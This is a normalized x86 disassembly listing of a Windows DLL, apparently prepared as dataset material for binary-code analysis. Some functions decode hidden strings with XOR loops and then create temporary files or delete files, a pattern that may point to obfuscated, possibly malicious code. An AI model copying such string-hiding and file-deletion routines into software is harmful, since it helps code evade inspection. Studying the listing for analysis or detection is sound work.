test cx cx
jne r-xdata
mov edi eax
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx edi
mov eax 0x104
mov ecx ebx
call sub_10072780
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
call [ StrToIntW@IAT ]
movzx eax ax
test ax ax
jne r-xdata
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_1006e1a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a37b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3f8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3f0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x408 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
mov [ esp + 0x48 ] esi
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] edi
mov [ esp + 0x410 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x410 ] 0x1
lea edx [ esp + 0x1a4 ]
mov eax 0x13b
mov [ esp + 0x20 ] edi
mov [ esp + 0x44 ] edi
call sub_10069020
mov eax edx
push eax
lea ecx [ esp + 0xcc ]
lea ebx [ esi + 0xc ]
push ecx
mov [ esp + 0x24 ] ebx
call sub_10029ef0
add esp 0x8
mov edx eax
lea ecx [ edi + 0xc ]
mov [ esp + 0x410 ] 0x2
call sub_10022b50
cmp [ esp + 0xdc ] 0x8
jb r-xdata
mov ecx [ esp + 0x408 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x3f0 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xa4 ]
sub ecx [ esi + 0xa0 ]
xor eax eax
sar ecx 0x3
xor ebx ebx
mov [ esp + 0xdc ] 0x7
mov [ esp + 0xd8 ] edi
mov [ esp + 0xc8 ] ax
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
xor eax eax
xor edx edx
mov [ esp + 0xb8 ] 0x7
mov [ esp + 0xb4 ] edi
mov [ esp + 0xa4 ] dx
mov [ esp + 0xc0 ] eax
mov [ esp + 0xc4 ] eax
mov [ esp + 0x410 ] 0x3
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0xffc4
and ecx 0xff
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] cx
mov ecx eax
push ecx
mov [ esp + 0x1e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ esp + 0x20c ]
call sub_1005bf30
test eax eax
jne r-xdata
mov ecx esi
lea eax [ esp + 0x34 ]
lea esi [ esp + 0x4c ]
call sub_10014b70
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x4c ]
mov eax esi
push eax
lea ecx [ esp + 0x4c ]
lea edi [ esp + 0x2c ]
mov [ esp + 0x418 ] 0x4
call sub_100017a0
test eax eax
je r-xdata
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
lea eax [ esp + 0x1f4 ]
lea edx [ eax + 0x2 ]
mov eax [ esp + 0x44 ]
cmp eax 0x1e84800
jge r-xdata
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
mov esi [ esp + 0x24 ]
xor ecx ecx
mov [ esp + 0xb8 ] 0x7
mov [ esp + 0xb4 ] edi
mov [ esp + 0xa4 ] cx
cmp esi edi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
call sub_1000a86e
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ esp + 0x1f8 ]
push ecx
lea ecx [ esp + 0xac ]
call sub_10034100
mov eax [ esi + 0xa0 ]
mov edx [ eax + ebx * 8 ]
mov [ esp + 0xc0 ] edx
mov eax [ eax + ebx * 8 + 0x4 ]
lea ecx [ esp + 0xa4 ]
lea edi [ esp + 0x24 ]
mov [ esp + 0xc4 ] eax
call sub_1006dc90
lea ecx [ esp + 0xa4 ]
lea edi [ esp + 0x34 ]
call sub_1002e170
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
lea edx [ esp + 0x14 ]
mov eax 0x114
call sub_10069020
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x20c ]
mov [ esp + 0x30 ] 0x1
call sub_1005bf30
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10003660
mov esi eax
test esi esi
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x5c
and edx 0xff
mov [ esp + eax * 2 + 0x12c ] dx
inc eax
cmp eax 0x39
jb r-xdata
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x12c ]
push ecx
lea edx [ esp + 0xe8 ]
xor eax eax
push edx
mov [ esp + 0x1a6 ] ax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0x5
call sub_10022b50
cmp [ esp + 0xf8 ] 0x8
jb r-xdata
mov esi [ esp + 0x34 ]
cmp esi edi
je r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
xor edi edi
mov edx [ esi + 0xa4 ]
sub edx [ esi + 0xa0 ]
inc ebx
sar edx 0x3
cmp ebx edx
jb r-xdata
mov ecx [ esp + 0xa4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x20 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x20 ]
push edx
push eax
lea eax [ esp + 0x1fc ]
call sub_1002f360
add esp 0x8
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x20 ]
mov ebx [ HeapFree@IAT ]
mov edi [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x12c ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0xa8 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x1c ]
lea eax [ esp + 0x12c ]
push eax
lea ecx [ esp + 0xe8 ]
push ecx
mov [ esp + 0x418 ] 0x6
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xc8 ]
mov [ esp + 0x410 ] 0x7
call sub_1006b070
mov ebx 0x8
mov edx eax
lea ecx [ ebx + 0x4 ]
mov [ esp + 0x410 ] bl
call sub_10022b50
cmp [ esp + 0xdc ] ebx
jb r-xdata
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_10054bf0
mov esi [ esp + 0x24 ]
test esi esi
je r-xdata
mov eax [ esp + 0xe4 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ecx
push esi
call sub_1001feb0
push esi
call sub_1000a86e
add esp 0x14
xor edi edi
jmp r-xdata
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
mov esi [ esp + 0x24 ]
cmp esi [ esp + 0x28 ]
je r-xdata
push eax
push 0x0
call edi
push eax
call ebx
xor esi esi
xor eax eax
mov edi 0x7
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] esi
mov [ esp + 0xc8 ] ax
cmp [ esp + 0xf8 ] ebx
jb r-xdata
mov edx [ esp + 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x34 ]
test esi esi
je r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x48 ]
mov edx [ esi + 0xa4 ]
mov ecx [ esi + 0xa0 ]
cmp ecx edx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
mov esi [ esp + 0x48 ]
mov edx [ esi + 0xa4 ]
mov ecx [ esi + 0xa0 ]
cmp ecx edx
je r-xdata
lea esp [ esp ]
xor edx edx
mov [ esp + 0xf8 ] edi
mov [ esp + 0xf4 ] esi
mov [ esp + 0xe4 ] dx
cmp [ esp + 0xb8 ] ebx
jb r-xdata
mov ecx [ esp + 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
push eax
push esi
call sub_1001feb0
push esi
call sub_1000a86e
add esp 0x14
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax edx
cmp edx edx
je r-xdata
mov ecx [ r--data ]
xor eax eax
mov eax edx
cmp edx edx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push 0x0
call edi
push eax
call ebx
add esi 0x24
cmp esi [ esp + 0x28 ]
jne r-xdata
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_10054bf0
mov ebx [ esp + 0x24 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ esp + 0x1f4 ]
push edx
call sub_10050cb0
mov esi eax
test esi esi
je r-xdata
mov ecx [ r--data ]
xor eax eax
lea ecx [ ecx ]
mov [ esi + 0xa4 ] ecx
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa5
and edx 0xff
mov [ esp + eax * 2 + 0x100 ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x100 ]
push ecx
lea edx [ esp + 0xa8 ]
xor eax eax
push edx
mov [ esp + 0x130 ] ax
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0x9
call sub_10022b50
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
mov [ esi + 0xa4 ] ecx
mov edi edi
mov edi [ esp + 0x34 ]
cmp edi esi
je r-xdata
mov edi [ esp + 0x28 ]
mov eax ebx
call sub_1006a100
push ebx
call sub_1000a86e
add esp 0x4
lea edx [ esp + 0x1f4 ]
push edx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x100 ]
mov eax 0xf0
call sub_10069020
mov ebx [ esp + 0x1c ]
mov eax edx
push eax
lea ecx [ esp + 0xa8 ]
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0x10
call sub_10022b50
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
lea eax [ esp + 0x1f4 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x12c ]
mov eax 0x99
call sub_10069020
push esi
lea esi [ esp + 0xa8 ]
call sub_1001ddf0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x1c ]
lea ecx [ esp + 0x12c ]
push ecx
lea edx [ esp + 0xcc ]
push edx
mov [ esp + 0x418 ] 0xd
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xe4 ]
mov [ esp + 0x410 ] 0xe
call sub_1006b070
mov edx eax
mov ecx 0xc
mov [ esp + 0x410 ] 0xf
call sub_10022b50
mov esi 0x8
cmp [ esp + 0xf8 ] esi
jb r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7e
and edx 0xff
mov [ esp + eax * 2 + 0x12c ] dx
inc eax
cmp eax 0x3b
jb r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
push ecx
lea esi [ esp + 0xa8 ]
mov [ esp + 0x1a6 ] ax
call sub_1001ddf0
add esp 0x4
mov esi eax
mov ebx [ esp + 0x1c ]
lea edx [ esp + 0x12c ]
push edx
lea eax [ esp + 0xcc ]
push eax
mov [ esp + 0x418 ] 0xa
call sub_10029ef0
add esp 0x8
mov ecx eax
mov eax esi
lea edi [ esp + 0xe4 ]
mov [ esp + 0x410 ] 0xb
call sub_1006b070
mov ecx 0xc
mov edx eax
mov [ esp + 0x410 ] cl
call sub_10022b50
cmp [ esp + 0xf8 ] 0x8
jb r-xdata
mov [ esp + 0x410 ] 0x1
mov eax [ esp + 0x4c ]
mov esi [ LocalFree@IAT ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
jmp r-xdata
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
push eax
push edi
call sub_1001feb0
push edi
call sub_1000a86e
add esp 0x14
mov edx [ esp + 0xa4 ]
push edx
xor ebx ebx
xor ecx ecx
mov edi 0x7
mov [ esp + 0xf8 ] edi
mov [ esp + 0xf4 ] ebx
mov [ esp + 0xe4 ] cx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov eax [ esp + 0xe4 ]
push eax
call sub_1000a86e
add esp 0x4
xor ebx ebx
xor edx edx
mov edi 0x8
mov esi 0x7
mov [ esp + 0xf8 ] esi
mov [ esp + 0xf4 ] ebx
mov [ esp + 0xe4 ] dx
cmp [ esp + 0xdc ] edi
jb r-xdata
mov ecx [ esp + 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push eax
call esi
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] ax
cmp [ esp + 0xb8 ] esi
jb r-xdata
mov edx [ esp + 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esp + 0xdc ] esi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] cx
cmp [ esp + 0xb8 ] edi
jb r-xdata
mov eax [ esp + 0xc8 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x58 ]
cmp eax edi
je r-xdata
push eax
call esi
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_10054bf0
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov ecx [ esp + 0xa4 ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ esp + 0x4c ]
mov [ esp + 0x410 ] 0x1
call sub_10054bf0
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov edx [ esp + 0xa4 ]
push edx
call sub_1000a86e
add esp 0x4
cmp [ esp + 0x5c ] edi
je r-xdata
push eax
call esi
mov esi [ esp + 0x34 ]
cmp esi ebx
je r-xdata
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x34 ]
test esi esi
je r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
mov eax [ esp + 0x60 ]
cmp eax edi
je r-xdata
mov [ esp + 0x5c ] edi
mov eax 0x5
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ecx
push esi
call sub_1001feb0
push esi
call sub_1000a86e
add esp 0x14
mov eax 0x4
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ecx
push esi
call sub_1001feb0
push esi
call sub_1000a86e
add esp 0x14
push ebx
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x64 ]
cmp eax edi
je r-xdata
push eax
call esi
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x68 ]
cmp eax edi
je r-xdata
push eax
call esi
cmp [ esp + 0x9c ] edi
je r-xdata
push eax
call esi
cmp [ esp + 0xa0 ] edi
je r-xdata
mov [ esp + 0x9c ] edi
mov ebx [ esp + 0x24 ]
cmp ebx edi
je r-xdata
lea esi [ esp + 0xa0 ]
call sub_1001b370
mov ebx [ esp + 0x34 ]
test ebx ebx
je r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
xor eax eax
mov edi [ esp + 0x38 ]
mov esi ebx
cmp ebx edi
je r-xdata
push ebx
call sub_1000a86e
add esp 0x4
mov edi edi
push ebx
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_1006ed60
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
xor edi edi
xor eax eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_1004b4b0
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10071f80
test eax eax
jne r-xdata
lea ebx [ esi + 0xd7c ]
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
call sub_100320b0
cmp eax [ esi + 0xd58 ]
je r-xdata
lea ebx [ esi + 0xd5c ]
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
push ebx
lea ecx [ edi + 0x12 ]
call sub_10012950
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov [ esi + 0xd58 ] eax
mov edi 0x1
jmp r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push ebx
mov ecx 0x10
call sub_10012950
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x64 ] edi
sub_1006ee94
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1006ef10
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov eax [ ecx + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov eax edx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_1006ef60
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10003c9c
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ esi ] eax
sub_1006efb0
cmp [ edx + 0xd6 ] 0x0
je r-xdata
mov eax [ edx + 0xd8 ]
mov eax [ edx + 0xdc ]
jmp r-xdata
mov eax 0x1f4
retn
sub eax ecx
retn
mov ecx [ edx + 0x108 ]
add ecx [ edx + 0x100 ]
mov edx [ edx + 0x50 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + edx + 0x4f ]
cmp eax ecx
jbe r-xdata
sub_1006f010
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
xor edi edi
mov ecx ebx
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
call sub_1002b2e0
fldz
fstp [ esi + 0x10 ]
mov [ esi ] r--data
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x5c
call sub_1002f620
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x24 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x24 ]
push ecx
push edi
push eax
mov [ esi + 0xc ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
fld [ ebx + 0x10 ]
mov ecx [ ebp - 0x4 ]
fstp [ esi + 0x10 ]
mov edx [ ebx + 0x18 ]
pop edi
mov [ esi + 0x18 ] edx
mov eax esi
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1006f0c0
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x110 ]
push eax
push 0x104
xor esi esi
call [ GetTempPathA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov esi [ r--data ]
xor cl cl
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa0
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
mov eax [ edi + 0x37c ]
push ebx
push eax
lea ecx [ eax + 0x1 ]
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x5 ] 0x0
mov [ edi + 0x37c ] ecx
call [ GetTempFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1006f170
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
jmp edx
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
sub_1006f199
push 0x10
mov eax sub_10085553
call sub_10026266
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1002bd30
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_1002be90
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10008d33
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_10030ff0
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_1006f2cf
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_1002e600
call sub_1001498c
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_1006f300
push ebp
mov ebp esp
push 0xffffffff
push sub_10088621
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xec ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xe8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0xe4 ] eax
movsx eax [ ecx ]
xor eax 0x30
xor ecx ecx
and eax 0xff
mov [ ebp - 0xdc ] ax
mov [ ebp - 0xda ] cx
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffa4
and esi 0xff
